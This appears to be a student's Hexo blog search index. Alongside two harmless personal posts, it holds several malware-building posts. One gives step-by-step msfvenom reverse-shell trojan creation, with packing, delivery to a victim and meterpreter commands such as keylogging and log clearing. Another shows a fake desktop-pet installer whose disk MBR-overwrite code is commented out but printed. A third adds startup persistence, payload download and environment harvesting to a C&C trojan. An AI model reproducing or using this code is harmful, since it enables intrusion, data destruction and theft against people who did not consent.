<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>kali下metasploit学习笔记</title>
    <url>/2023/04/15/kali%E4%B8%8Bmetasploit%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="怎样使用metasploit生成木马-作者Ericyin"><a href="#怎样使用metasploit生成木马-作者Ericyin" class="headerlink" title="怎样使用metasploit生成木马 作者Ericyin"></a>怎样使用metasploit生成木马 作者Ericyin</h1><span id="more"></span>
<p>第一步：<br>打开kali终端<br>第二步：<br>键入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>

<p>以管理员形式运行终端<br>第三步：<br>用 cd 指令切换到自己想要生成木马的文件夹<br>第四步：<br>键入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
<p>找到自己的ip<br>第五步：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=<span class="string">&quot;本机ip&quot;</span> lport=4444 -f exe -o “想要的木马名字.exe”</span><br></pre></td></tr></table></figure>

<p>第六步：<br>生成完后，把木马拽到Windows主机<br>第七步（可选）：<br>用加壳软件加壳<br>第八步：<br>在kali linux 终端中输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
<p>第九步：<br>等待加载完毕后，输入指令设置msf</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lhost 4444</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lport <span class="string">&quot;本机ip&quot;</span></span><br></pre></td></tr></table></figure>
<p>要一条一条设置<br>第十步：<br>运行 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p> 或者 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
<p> 监听<br>发给目标主机，等待他双击木马程序<br>第十一步：<br>有了shell反弹后，目标主机的电脑就是你的啦</p>
<p>命令大全：<br>在其最基本的使用，meterpreter 是一个 Linux 终端在受害者的计算机上。这样，我们的许多基本的Linux命令可以用在meterpreter甚至是在一个窗口或其他操作系统。</p>
<p>这里有一些核心的命令可以用在meterpreter。（参考cnds）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">? – 帮助菜单</span><br><span class="line">background – 将当前会话移动到背景</span><br><span class="line">bgkill – 杀死一个背景 meterpreter 脚本</span><br><span class="line">bglist – 提供所有正在运行的后台脚本的列表</span><br><span class="line">bgrun – 作为一个后台线程运行脚本</span><br><span class="line">channel – 显示活动频道</span><br><span class="line">close – 关闭通道</span><br><span class="line"><span class="built_in">exit</span> – 终止 meterpreter 会话</span><br><span class="line"><span class="built_in">help</span> – 帮助菜单</span><br><span class="line">interact – 与通道进行交互</span><br><span class="line">irb – 进入 Ruby 脚本模式</span><br><span class="line">migrate – 移动到一个指定的 PID 的活动进程</span><br><span class="line">quit – 终止 meterpreter 会话</span><br><span class="line"><span class="built_in">read</span> – 从通道读取数据</span><br><span class="line">run – 执行以后它选定的 meterpreter 脚本</span><br><span class="line">use – 加载 meterpreter 的扩展</span><br><span class="line">write – 将数据写入到一个通道</span><br><span class="line">第2种：文件系统命令</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> -读取并输出到标准输出文件的内容</span><br><span class="line"><span class="built_in">cd</span> -更改目录对受害人</span><br><span class="line">del -删除文件对受害人</span><br><span class="line">download-从受害者系统文件下载</span><br><span class="line">edit-用 vim编辑文件</span><br><span class="line">getlwd -打印本地目录</span><br><span class="line">getwd -打印工作目录</span><br><span class="line">lcd -更改本地目录</span><br><span class="line">lpwd -打印本地目录</span><br><span class="line"><span class="built_in">ls</span> -列出在当前目录中的文件列表</span><br><span class="line"><span class="built_in">mkdir</span> -在受害者系统上的创建目录</span><br><span class="line"><span class="built_in">pwd</span> -输出工作目录</span><br><span class="line"><span class="built_in">rm</span> -删除文件</span><br><span class="line"><span class="built_in">rmdir</span> -受害者系统上删除目录</span><br><span class="line">upload-从攻击者的系统往受害者系统上传文件</span><br><span class="line">第 3 种： 网络命令</span><br><span class="line"></span><br><span class="line">ipconfig -显示网络接口的关键信息，包括 IP 地址、 等。</span><br><span class="line">portfwd -端口转发</span><br><span class="line">route -查看或修改受害者路由表</span><br><span class="line">第 4 种： 系统命令</span><br><span class="line"></span><br><span class="line">clearav -清除了受害者的计算机上的事件日志</span><br><span class="line">drop_token -被盗的令牌</span><br><span class="line">execute-执行命令</span><br><span class="line">getpid -获取当前进程 ID (PID)</span><br><span class="line">getprivs -尽可能获取尽可能多的特权</span><br><span class="line">getuid -获取作为运行服务器的用户</span><br><span class="line"><span class="built_in">kill</span> -终止指定 PID 的进程</span><br><span class="line">ps -列出正在运行的进程</span><br><span class="line">reboot-重新启动受害人的计算机</span><br><span class="line">reg -与受害人的注册表进行交互</span><br><span class="line">rev2self -在受害者机器上调用 RevertToSelf()</span><br><span class="line">shell -在受害者计算机上打开一个shell</span><br><span class="line">shutdown-关闭了受害者的计算机</span><br><span class="line">steal_token -试图窃取指定的 (PID) 进程的令牌</span><br><span class="line">sysinfo -获取有关受害者计算机操作系统和名称等的详细信息</span><br><span class="line">scrennshot -截取受害者主机图片</span><br><span class="line">第 5 种： 用户界面命令</span><br><span class="line"></span><br><span class="line">enumdesktops -列出所有可访问台式机</span><br><span class="line">getdesktop -获取当前的 meterpreter 桌面</span><br><span class="line">idletime -检查长时间以来，受害者系统空闲进程</span><br><span class="line">keyscan_dump -键盘记录软件的内容转储</span><br><span class="line">keyscan_start -启动时与如 Word 或浏览器的进程相关联的键盘记录软件</span><br><span class="line">keyscan_stop -停止键盘记录软件</span><br><span class="line">screenshot-抓去 meterpreter 桌面的屏幕截图</span><br><span class="line">set_desktop -更改 meterpreter 桌面</span><br><span class="line">uictl -启用用户界面组件的一些控件</span><br><span class="line">第 6 种： 特权升级命令</span><br><span class="line"></span><br><span class="line">getsystem -获得系统管理员权限</span><br><span class="line"></span><br></pre></td></tr></table></figure>


]]></content>
  </entry>
  <entry>
    <title>开始</title>
    <url>/2023/04/09/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%9D%A5%E5%88%B0%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="The-beginning开始"><a href="#The-beginning开始" class="headerlink" title="The beginning开始"></a>The beginning开始</h1><p>一个不务正业的学生党</p>
<p>此博客更新：<br>个人<strong>笔记</strong>，最近<strong>成就</strong><br>内容<em>可能来自各种圈子</em></p>
<p>b站主页 <a href="https://space.bilibili.com/421460169?spm_id_from=333.1007.0.0">Eric的主页</a></p>
]]></content>
  </entry>
  <entry>
    <title>英语课本剧</title>
    <url>/2023/04/12/%E8%8B%B1%E8%AF%AD%E8%AF%BE%E6%9C%AC%E5%89%A7/</url>
    <content><![CDATA[<p>明天有英语课本剧，wwr同学的ppt可谓相当炸裂<br>6<br><img src="/img/ppt.png" alt="ppt"></p>
<span id="more"></span>
<p>小黑子元素过于多了，不过剧本写得还可以，祝我们成功</p>
]]></content>
  </entry>
  <entry>
    <title>Python下Win32库自制MBR病毒</title>
    <url>/2023/05/25/Python%E4%B8%8BWin32%E5%BA%93%E8%87%AA%E5%88%B6MBR%E7%97%85%E6%AF%92/</url>
    <content><![CDATA[<h1 id="Python-MBR-病毒！"><a href="#Python-MBR-病毒！" class="headerlink" title="Python MBR 病毒！"></a>Python MBR 病毒！</h1><p><em>下载链接</em>：</p>
<p><a href="https://wwpw.lanzouf.com/i2iU90xfmzne">https://wwpw.lanzouf.com/i2iU90xfmzne</a><br>密码:ce2t</p>
<span id="more"></span>
<p>这个病毒的灵感来源于我在网课期间下载的桌宠<br>诶，当时我就想：<strong>如果把他做成一个病毒怎样？</strong></p>
<p>作为一个不会用Python的垃圾中学牲，我开始了思考：<br>首先它就得有一些桌宠的功能，比方说和你互动之类的<br>但是又觉得好像有点难<br>因为技术不行，我还是觉得把他伪装成一个安装程序比较好（后续可能用tkinter库做一下GUI？）<br>那这样我们不就言之有理拿到管理员权限了？<br>再结合一些有害的批处理命令，那不就行了？<br>接着，我就想到了MEZE彩虹猫，他不是有覆写MBR的功能吗？<br>众所周知，py几乎是万能的，win32库都可以无管理员修改注册表了，覆写MBR岂不不在话下？<br>于是在GitHub上就找到了</p>
<p><a href="https://github.com/Itzsten/Python-MBR-Overwriting">Py覆写MBR</a></p>
<p>理论存在，实践开始</p>
<p><a href="https://www.bilibili.com/video/BV1dN411y7RG/?share_source=copy_web&vd_source=297ebbe99e2ce66e06f4cf49d8b620f4">虚拟机测试</a></p>
<p>有害代码已注释</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">from win32gui import *</span><br><span class="line">from win32file import *</span><br><span class="line">from win32gui import *</span><br><span class="line">from sys import <span class="built_in">exit</span></span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line">import random</span><br><span class="line">import tkinter as tk</span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">hDevice = CreateFileW(&quot;\\\\.\\PhysicalDrive0&quot;, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) # Create a handle to our Physical Drive</span></span><br><span class="line"><span class="string">WriteFile(hDevice, AllocateReadBuffer(512), None) # Overwrite the MBR! (Never run this on your main machine!)</span></span><br><span class="line"><span class="string">CloseHandle(hDevice) # Close the handle to our Physical Drive!</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">def setup():</span><br><span class="line">    os.system(<span class="string">&#x27; mshta vbscript:msgbox(&quot;欢迎使用ERIX桌宠安装向导，点击开始安装&quot;,32,&quot;欢迎&quot;)(window.close)&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;dir /s&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;msg %username% /time:5 &quot;解压中......&quot;&#x27;</span>)</span><br><span class="line">    time.sleep(5)</span><br><span class="line">    os.system(<span class="string">&#x27;msg %username% /time:5 &quot;安装中......&quot;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;10%&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;25%&#x27;</span>)</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;40%&#x27;</span>)</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;55%&#x27;</span>)</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;65%&#x27;</span>)</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;85%&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;95%&#x27;</span>)</span><br><span class="line">    time.sleep(4)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;msg %username% /time:5 &quot;取名操作请在cmd完成&quot;&#x27;</span>)</span><br><span class="line">    name = input(<span class="string">&#x27;请给他取个名字：&#x27;</span>)</span><br><span class="line">    os.system(f<span class="string">&#x27;msg %username% /time:2 &quot;正在生成桌宠：可爱的&#123;name&#125;........&quot;&#x27;</span>)</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    os.system(<span class="string">&#x27;msg %username% /time:2 &quot;完成！&quot;&#x27;</span>)</span><br><span class="line">    time.sleep(5)</span><br><span class="line">    os.system(f<span class="string">&#x27; mshta vbscript:msgbox(&quot;&#123;name&#125;想和你一起听歌&quot;,64,&quot;警告&quot;)(window.close)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    os.system(<span class="string">&#x27;start https://www.bilibili.com/video/BV1GJ411x7h7/&#x27;</span>)</span><br><span class="line">    os.system(f<span class="string">&#x27; mshta vbscript:msgbox(&quot;&#123;name&#125;想在你的MBR睡觉！&quot;,48,&quot;警告&quot;)(window.close)&#x27;</span>)</span><br><span class="line">    os.system(f<span class="string">&#x27; mshta vbscript:msgbox(&quot;&#123;name&#125;的口水流到了你的cpu上！&quot;,48,&quot;警告&quot;)(window.close)&#x27;</span>)</span><br><span class="line">def boom():</span><br><span class="line">    window = tk.Tk()</span><br><span class="line">    width = window.winfo_screenwidth()</span><br><span class="line">    height = window.winfo_screenheight()</span><br><span class="line">    a = random.randrange(0, width)</span><br><span class="line">    b = random.randrange(0, height)</span><br><span class="line">    window.title(<span class="string">&#x27;完了&#x27;</span>)</span><br><span class="line">    window.geometry(<span class="string">&quot;200x50&quot;</span> + <span class="string">&quot;+&quot;</span> + str(a) + <span class="string">&quot;+&quot;</span> + str(b))</span><br><span class="line">    tk.Label(window, text=<span class="string">&#x27;你电脑没了！&#x27;</span>, <span class="built_in">bg</span>=<span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">             font=(<span class="string">&#x27;宋体&#x27;</span>, 17), width=20, height=4).pack()</span><br><span class="line">    window.mainloop()</span><br><span class="line"><span class="comment">#弹窗效果</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    setup()</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(100):</span><br><span class="line">        t = threading.Thread(target=boom)</span><br><span class="line">        threads.append(t)</span><br><span class="line">        time.sleep(0.001)</span><br><span class="line">        threads[i].start()</span><br><span class="line">    <span class="comment">#os.system(&#x27;taskkill /f /fi &quot;pid ne 1&quot;&#x27;)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>拥有一个利用github通信的属于自己的木马病毒！</title>
    <url>/2023/07/21/%E6%8B%A5%E6%9C%89%E4%B8%80%E4%B8%AA%E5%88%A9%E7%94%A8github%E9%80%9A%E4%BF%A1%E7%9A%84%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92%EF%BC%81/</url>
    <content><![CDATA[<p>好久不写博客了，写博客是个好习惯XD</p>
<h1 id="是的，正如标题所说，我做了一个C-amp-C（command-amp-control）通信的木马"><a href="#是的，正如标题所说，我做了一个C-amp-C（command-amp-control）通信的木马" class="headerlink" title="是的，正如标题所说，我做了一个C&amp;C（command&amp;control）通信的木马"></a>是的，正如标题所说，我做了一个C&amp;C（command&amp;control）通信的木马</h1><span id="more"></span>

<p>这个木马不再需要你去琢磨怎样搞内网穿透，而是直接连接服务器,拉取需要的任务，再执行<br>具体的内容你可以看《Python黑帽子》一书,里面有源代码（啊对，这玩意不是我写的，以我的技术怎么可能嘛</p>
<p><em>但是</em>作者在书中给我们留下了回味空间，只给出了两个基本的模块，那想要这个木马变得更好，肯定要再加一些模块</p>
<p>首先我想到的就是加入开机启动项，写入注册表不安全，会被杀软查到，所以就放入开始菜单文件夹的启动一项</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import os </span><br><span class="line">import sys</span><br><span class="line">def run():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*]In shutdown moudule.&#x27;</span>)</span><br><span class="line">    path = os.path.abspath(sys.argv[0])</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&#x27;&#123;path&#125;&#x27;</span>)</span><br><span class="line">    os.system(f<span class="string">&#x27;copy &#123;path&#125; &quot;%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&quot;&#x27;</span>)</span><br><span class="line"><span class="comment">#别问我为啥要用cmd指令，问就是别的不会TT</span></span><br></pre></td></tr></table></figure>
<p>这样我的木马就驻扎在了受害者电脑里<br>那如果我需要一些更多的模块在受害者电脑上捣乱，是不是就要在他电脑上安装python了？（doge<br>没那么麻烦，只需要自动拉取仓库就可以了<br>这里使用了request库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;木马的url&quot;</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line"></span><br><span class="line">with open(<span class="string">&quot;sys.exe&quot;</span>, <span class="string">&quot;wb&quot;</span>) as f:</span><br><span class="line">    f.write(r.content)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>书中的获取环境变量模块比较简陋，我应该让他返回一个整齐地、能返回用户名和所在文件目录信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">def run():</span><br><span class="line">    usn = <span class="string">&#x27;username:&#x27;</span> + os.getlogin()</span><br><span class="line">    pth = <span class="string">&#x27;path:&#x27;</span> + os.getcwd()</span><br><span class="line">    evn = os.environ</span><br><span class="line">    msg = f<span class="string">&#x27;&#123;usn&#125;\n&#123;pth&#125;\n&#123;evn&#125;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&#x27;&#123;msg&#125;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>氢氢悚悚！（doge</p>
]]></content>
  </entry>
</search>
